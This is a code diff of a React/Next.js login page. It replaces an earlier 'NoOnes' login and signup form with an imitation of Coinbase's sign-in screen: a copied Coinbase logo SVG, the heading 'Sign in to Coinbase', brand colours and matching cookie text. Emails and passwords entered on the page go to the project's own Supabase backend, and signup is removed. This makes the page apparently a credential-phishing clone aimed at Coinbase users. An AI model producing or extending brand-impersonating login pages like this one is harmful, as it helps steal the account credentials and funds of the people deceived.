@@ -1,33 +1,65 @@
 'use client';
 
-import React, { useState } from 'react';
+import React, { useEffect, useState } from 'react';
 import Image from 'next/image';
 import { useRouter } from 'next/navigation';
-import { motion } from 'framer-motion';
 import { Inter } from 'next/font/google';
-import { ChevronDown, Eye, EyeOff, Sun, Moon } from 'lucide-react';
+import { Eye, EyeOff, KeyRound } from 'lucide-react';
 import { createClient } from '@/lib/supabase/client';
 
 const inter = Inter({ subsets: ['latin'], weight: ['400', '500', '600', '700'] });
 
-const socialProviders = [
-  { name: 'Google', logo: '/logos/google-icon-logo-svgrepo-com.svg' },
-  { name: 'Apple', logo: '/logos/apple-logo-svgrepo-com.svg' },
-  { name: 'Telegram', logo: '/logos/telegram-svgrepo-com.svg' },
-];
+function CoinbaseMark({ dark }) {
+  return (
+    <svg viewBox="0 0 52 52" aria-hidden="true" className={`h-[50px] w-[50px] ${dark ? 'text-white' : 'text-[#1652f0]'}`}>
+      <path
+        d="M26 4.5C14.126 4.5 4.5 14.126 4.5 26S14.126 47.5 26 47.5c8.965 0 16.649-5.49 19.862-13.286H34.704A10.84 10.84 0 0 1 26 38.575c-6.944 0-12.575-5.631-12.575-12.575S19.056 13.425 26 13.425c3.462 0 6.597 1.4 8.87 3.668h10.992C42.649 9.99 34.965 4.5 26 4.5Z"
+        fill="currentColor"
+      />
+    </svg>
+  );
+}
+
+function SocialButton({ children, dark, icon }) {
+  return (
+    <button
+      type="button"
+      className={`flex h-[74px] w-full items-center rounded-[37px] px-7 text-left transition-colors ${
+        dark ? 'bg-[#2a2c34] text-white hover:bg-[#30333d]' : 'bg-[#f1f3f8] text-[#0a0b0d] hover:bg-[#e8ebf2]'
+      }`}
+    >
+      <div className="flex w-[42px] justify-center">{icon}</div>
+      <span className="ml-5 text-[20px] font-semibold tracking-[-0.025em]">{children}</span>
+    </button>
+  );
+}
 
 export default function ConnectPage() {
   const router = useRouter();
-  const [mode, setMode] = useState('login');
-  const [isDarkPreview, setIsDarkPreview] = useState(false);
+  const [step, setStep] = useState('email');
+  const [isDarkTheme, setIsDarkTheme] = useState(false);
   const [showPassword, setShowPassword] = useState(false);
   const [credentials, setCredentials] = useState({
-    emailOrPhone: '',
+    email: '',
     password: '',
   });
   const [loading, setLoading] = useState(false);
   const [errorMessage, setErrorMessage] = useState('');
-  const [successMessage, setSuccessMessage] = useState('');
+
+  useEffect(() => {
+    const mediaQuery = window.matchMedia('(prefers-color-scheme: dark)');
+
+    const syncTheme = () => {
+      setIsDarkTheme(mediaQuery.matches);
+    };
+
+    syncTheme();
+    mediaQuery.addEventListener('change', syncTheme);
+
+    return () => {
+      mediaQuery.removeEventListener('change', syncTheme);
+    };
+  }, []);
 
   const handleFieldChange = (field) => (event) => {
     setCredentials((current) => ({
@@ -36,17 +68,28 @@ export default function ConnectPage() {
     }));
   };
 
-  const handleSubmit = async (event) => {
+  const handleContinue = (event) => {
+    event.preventDefault();
+    setErrorMessage('');
+
+    if (!credentials.email.trim()) {
+      setErrorMessage('Enter your email address to continue.');
+      return;
+    }
+
+    setStep('password');
+  };
+
+  const handlePasswordSubmit = async (event) => {
     event.preventDefault();
 
-    const email = credentials.emailOrPhone.trim();
+    const email = credentials.email.trim();
     const password = credentials.password;
 
     setErrorMessage('');
-    setSuccessMessage('');
 
     if (!email || !password) {
-      setErrorMessage('Please provide both email and password.');
+      setErrorMessage('Enter your email and password to continue.');
       return;
     }
 
@@ -54,24 +97,7 @@ export default function ConnectPage() {
 
     try {
       const supabase = createClient();
-
-      if (mode === 'login') {
-        const { error } = await supabase.auth.signInWithPassword({
-          email,
-          password,
-        });
-
-        if (error) {
-          setErrorMessage(error.message);
-          return;
-        }
-
-        router.push('/dashboard');
-        router.refresh();
-        return;
-      }
-
-      const { data, error } = await supabase.auth.signUp({
+      const { error } = await supabase.auth.signInWithPassword({
         email,
         password,
       });
@@ -81,179 +107,176 @@ export default function ConnectPage() {
         return;
       }
 
-      if (data?.user) {
-        await supabase.from('profiles').upsert(
-          {
-            id: data.user.id,
-            email: data.user.email,
-          },
-          { onConflict: 'id' }
-        );
-      }
-
-      if (data?.session) {
-        router.push('/dashboard');
-        router.refresh();
-        return;
-      }
-
-      setSuccessMessage('Signup successful. Check your email to confirm your account.');
+      router.push('/dashboard');
+      router.refresh();
     } finally {
       setLoading(false);
     }
   };
 
+  const dark = isDarkTheme;
+  const pageClasses = dark ? 'bg-[#0b0b0d] text-white' : 'bg-white text-[#0b0b0d]';
+  const labelClasses = dark ? 'text-white' : 'text-[#101114]';
+  const mutedClasses = dark ? 'text-[#9fa3b3]' : 'text-[#6b7280]';
+  const dividerClasses = dark ? 'bg-[#30323a]' : 'bg-[#d9dbe1]';
+  const inputClasses = dark
+    ? 'border-[#4a4d57] bg-[#0b0b0d] text-white placeholder:text-[#707482]'
+    : 'border-[#babdc7] bg-white text-[#0b0b0d] placeholder:text-[#6d7482]';
+  const primaryButtonClasses = dark
+    ? 'bg-[#334a87] text-[#090b10] hover:bg-[#3c569b]'
+    : 'bg-[#84aaf7] text-white hover:bg-[#78a0f1]';
+
   return (
-    <main
-      className={`${inter.className} min-h-screen bg-[#eeeeef] text-[#17171f] overflow-x-hidden px-4 pb-10 pt-14 sm:px-6 sm:pb-14 sm:pt-20`}
-    >
-      <motion.section
-        initial={{ opacity: 0, y: 20 }}
-        animate={{ opacity: 1, y: 0 }}
-        transition={{ duration: 0.5, ease: 'easeOut' }}
-        className="relative z-10 mx-auto w-full max-w-[430px]"
-      >
-        <div className="mb-10 flex justify-center sm:mb-12">
-          <Image
-            src="/logos/noones.jpg"
-            alt="Noones"
-            width={186}
-            height={62}
-            priority
-            className="h-auto w-[186px] object-contain"
-          />
+    <main className={`${inter.className} ${pageClasses} min-h-screen overflow-x-hidden`}>
+      <section className="mx-auto flex min-h-screen w-full max-w-[430px] flex-col px-[23px] pb-10 pt-[42px] sm:px-8">
+        <div className="flex justify-start">
+          <CoinbaseMark dark={dark} />
         </div>
 
-        <div className="rounded-[18px] bg-white px-6 py-9 shadow-[0_3px_14px_rgba(15,23,42,0.05)] sm:px-7 sm:py-10">
-          <h1 className="text-center text-[31px] font-bold tracking-[-0.03em] text-[#020617] sm:text-[33px]">
-            Welcome to NoOnes
+        <div className="pt-[92px]">
+          <h1 className="max-w-[340px] text-[34px] font-semibold leading-[1.08] tracking-[-0.04em] sm:text-[36px]">
+            {step === 'email' ? 'Sign in to Coinbase' : 'Enter your password'}
           </h1>
 
-          <div className="mt-7 flex items-center justify-center gap-6">
-            {socialProviders.map((provider) => (
-              <button
-                key={provider.name}
-                type="button"
-                aria-label={`Continue with ${provider.name}`}
-                className="flex h-12 w-12 items-center justify-center rounded-full transition-colors hover:bg-[#f3f4f6]"
-              >
-                <div className="relative h-9 w-9">
-                  <Image
-                    src={provider.logo}
-                    alt={`${provider.name} logo`}
-                    fill
-                    sizes="36px"
-                    className="object-contain"
-                  />
-                </div>
-              </button>
-            ))}
-          </div>
+          <form onSubmit={step === 'email' ? handleContinue : handlePasswordSubmit} className="mt-[58px]">
+            <label htmlFor="coinbase-email" className={`${labelClasses} block text-[18px] font-semibold tracking-[-0.02em]`}>
+              {step === 'email' ? 'Email' : 'Email address'}
+            </label>
 
-          <form onSubmit={handleSubmit} className="mt-9 space-y-5">
-            <div className="space-y-2.5">
-              <label className="block text-[16px] font-semibold tracking-[-0.01em] text-[#4b5563]" htmlFor="emailOrPhone">
-                Email/Phone number
-              </label>
+            <div className="mt-[18px]">
               <input
-                id="emailOrPhone"
-                type="text"
-                value={credentials.emailOrPhone}
-                onChange={handleFieldChange('emailOrPhone')}
-                placeholder="Email/Phone number"
-                className="w-full rounded-[16px] border-none bg-[#f3f3f4] px-8 py-[17px] text-[17px] font-semibold tracking-[-0.015em] text-[#0f172a] placeholder:text-[#b7c8c4] focus:outline-none focus:ring-2 focus:ring-[#00A651]/20"
+                id="coinbase-email"
+                type="email"
+                value={credentials.email}
+                onChange={handleFieldChange('email')}
+                placeholder="Your email address"
                 autoComplete="username"
+                readOnly={step === 'password'}
+                className={`h-[76px] w-full rounded-[17px] border px-[32px] text-[18px] font-normal tracking-[-0.025em] outline-none transition-colors focus:border-[#7b96d8] ${inputClasses} ${step === 'password' ? 'opacity-80' : ''}`}
               />
             </div>
 
-            <div className="space-y-2.5">
-              <label className="block text-[16px] font-semibold tracking-[-0.01em] text-[#4b5563]" htmlFor="password">
-                Password
-              </label>
-              <div className="relative">
-                <input
-                  id="password"
-                  type={showPassword ? 'text' : 'password'}
-                  value={credentials.password}
-                  onChange={handleFieldChange('password')}
-                  placeholder="Password"
-                  className="w-full rounded-[16px] border-none bg-[#f3f3f4] px-8 py-[17px] pr-16 text-[17px] font-semibold tracking-[-0.015em] text-[#0f172a] placeholder:text-[#b7c8c4] focus:outline-none focus:ring-2 focus:ring-[#00A651]/20"
-                  autoComplete="current-password"
-                />
-                <button
-                  type="button"
-                  onClick={() => setShowPassword((current) => !current)}
-                  className="absolute inset-y-0 right-0 inline-flex items-center justify-center px-5 text-[#111111]"
-                  aria-label={showPassword ? 'Hide password' : 'Show password'}
-                >
-                  {showPassword ? <Eye className="h-5 w-5" strokeWidth={2.1} /> : <EyeOff className="h-5 w-5" strokeWidth={2.1} />}
-                </button>
-              </div>
-            </div>
-
-            <div className="flex justify-end -mt-1">
-              <button
-                type="button"
-                className="text-[15px] font-semibold text-[#05b773] underline underline-offset-[3px] transition-colors hover:text-[#029c61]"
-              >
-                Forgot password?
-              </button>
-            </div>
+            {step === 'password' ? (
+              <>
+                <label htmlFor="coinbase-password" className={`${labelClasses} mt-[26px] block text-[18px] font-semibold tracking-[-0.02em]`}>
+                  Password
+                </label>
+                <div className="relative mt-[18px]">
+                  <input
+                    id="coinbase-password"
+                    type={showPassword ? 'text' : 'password'}
+                    value={credentials.password}
+                    onChange={handleFieldChange('password')}
+                    placeholder="Your password"
+                    autoComplete="current-password"
+                    className={`h-[76px] w-full rounded-[17px] border px-[32px] pr-20 text-[18px] font-normal tracking-[-0.025em] outline-none transition-colors focus:border-[#7b96d8] ${inputClasses}`}
+                  />
+                  <button
+                    type="button"
+                    onClick={() => setShowPassword((current) => !current)}
+                    className={`absolute inset-y-0 right-0 flex items-center px-7 ${mutedClasses}`}
+                    aria-label={showPassword ? 'Hide password' : 'Show password'}
+                  >
+                    {showPassword ? <EyeOff className="h-6 w-6" strokeWidth={2} /> : <Eye className="h-6 w-6" strokeWidth={2} />}
+                  </button>
+                </div>
+              </>
+            ) : null}
 
             <button
               type="submit"
               disabled={loading}
-              aria-label="Log in"
-              className="mt-2 flex w-full items-center justify-center rounded-[17px] bg-[#10bf7a] px-5 py-[18px] text-white transition-colors duration-200 hover:bg-[#0cae70] disabled:cursor-not-allowed disabled:opacity-70"
+              className={`mt-[30px] flex h-[74px] w-full items-center justify-center rounded-[37px] text-[20px] font-semibold tracking-[-0.02em] transition-colors disabled:opacity-70 ${primaryButtonClasses}`}
             >
-              <span className="text-[22px] font-bold tracking-[-0.02em]">{mode === 'login' ? 'Log in' : 'Sign up'}</span>
+              {loading ? 'Signing in...' : 'Continue'}
             </button>
 
-            {errorMessage ? <p className="text-sm text-red-500">{errorMessage}</p> : null}
-            {successMessage ? <p className="text-sm text-emerald-600">{successMessage}</p> : null}
+            {step === 'password' ? (
+              <button
+                type="button"
+                onClick={() => {
+                  setStep('email');
+                  setErrorMessage('');
+                }}
+                className={`mt-4 text-[15px] font-medium underline underline-offset-4 ${dark ? 'text-[#c4cada]' : 'text-[#4b5563]'}`}
+              >
+                Back to email
+              </button>
+            ) : null}
+
+            {errorMessage ? <p className="mt-4 text-[14px] text-[#d14343]">{errorMessage}</p> : null}
           </form>
 
-          <div className="mt-11 text-center text-[17px] text-[#4b5563]">
-            {mode === 'login' ? 'No account yet?' : 'Already have an account?'}{' '}
-            <button
-              type="button"
-              onClick={() => setMode((current) => (current === 'login' ? 'signup' : 'login'))}
-              className="font-semibold text-[#05b773] underline underline-offset-[3px] transition-colors hover:text-[#029c61]"
-            >
-              {mode === 'login' ? 'Sign up' : 'Log in'}
-            </button>
-          </div>
+          {step === 'email' ? (
+            <>
+              <div className="mt-[42px] flex items-center gap-8">
+                <div className={`h-px flex-1 ${dividerClasses}`} />
+                <span className={`${mutedClasses} text-[18px] font-medium tracking-[-0.02em]`}>OR</span>
+                <div className={`h-px flex-1 ${dividerClasses}`} />
+              </div>
 
+              <div className="mt-[42px] space-y-5">
+                <SocialButton
+                  dark={dark}
+                  icon={<KeyRound className="h-[27px] w-[27px]" strokeWidth={2.2} />}
+                >
+                  Sign in with passkey
+                </SocialButton>
+
+                <SocialButton
+                  dark={dark}
+                  icon={
+                    <Image
+                      src="/logos/google-icon-logo-svgrepo-com.svg"
+                      alt="Google"
+                      width={28}
+                      height={28}
+                      className={`h-7 w-7 object-contain ${dark ? 'brightness-0 invert' : 'brightness-0'}`}
+                    />
+                  }
+                >
+                  Sign in with Google
+                </SocialButton>
+
+                <SocialButton
+                  dark={dark}
+                  icon={
+                    <Image
+                      src="/logos/apple-logo-svgrepo-com.svg"
+                      alt="Apple"
+                      width={27}
+                      height={27}
+                      className={`h-[27px] w-[27px] object-contain ${dark ? 'brightness-0 invert' : 'brightness-0'}`}
+                    />
+                  }
+                >
+                  Sign in with Apple
+                </SocialButton>
+              </div>
+
+              <p className="mt-[56px] text-center text-[18px] font-semibold tracking-[-0.03em]">
+                <span className={dark ? 'text-white' : 'text-[#111217]'}>Don't have an account? </span>
+                <button type="button" className="text-[#1652f0]">
+                  Sign up
+                </button>
+              </p>
+            </>
+          ) : null}
         </div>
 
-        <div className="mt-9 flex items-center justify-between gap-4 px-1 text-sm text-[#6b7280]">
-          <div className="flex items-center gap-4">
-            <Sun className="h-8 w-8 text-[#0cb878]" strokeWidth={1.8} />
-            <button
-              type="button"
-              onClick={() => setIsDarkPreview((current) => !current)}
-              className="relative inline-flex h-[40px] w-[92px] items-center rounded-[12px] bg-[#10bf7a] px-[5px] transition-colors"
-              aria-label="Toggle theme"
-            >
-              <span
-                className={`h-[30px] w-[30px] rounded-[10px] bg-white shadow-[0_1px_2px_rgba(0,0,0,0.08)] transition-transform duration-200 ${
-                  isDarkPreview ? 'translate-x-[52px]' : 'translate-x-0'
-                }`}
-              />
+        <div className="mt-auto pt-16">
+          <p className={`${mutedClasses} text-[15px] leading-[1.34] tracking-[-0.02em]`}>
+            We use strictly necessary cookies to enable essential functions, such as security and authentication. For more information, see our{' '}
+            <button type="button" className={`underline underline-offset-[3px] ${mutedClasses}`}>
+              Cookie Policy
+            </button>{' '}
+            and{' '}
+            <button type="button" className={`underline underline-offset-[3px] ${mutedClasses}`}>
+              Privacy Policy.
             </button>
-            <Moon className="h-8 w-8 text-[#0f172a]" strokeWidth={1.8} />
-          </div>
-
-          <button
-            type="button"
-            className="inline-flex items-center gap-2 rounded-full px-1 py-1 text-[16px] font-semibold text-[#05b773] underline underline-offset-[4px] transition-colors hover:text-[#029c61]"
-            aria-label="Select language"
-          >
-            <span>English</span>
-            <ChevronDown className="h-[18px] w-[18px]" strokeWidth={2.2} />
-          </button>
+          </p>
         </div>
-      </motion.section>
+      </section>
     </main>
   );
 }
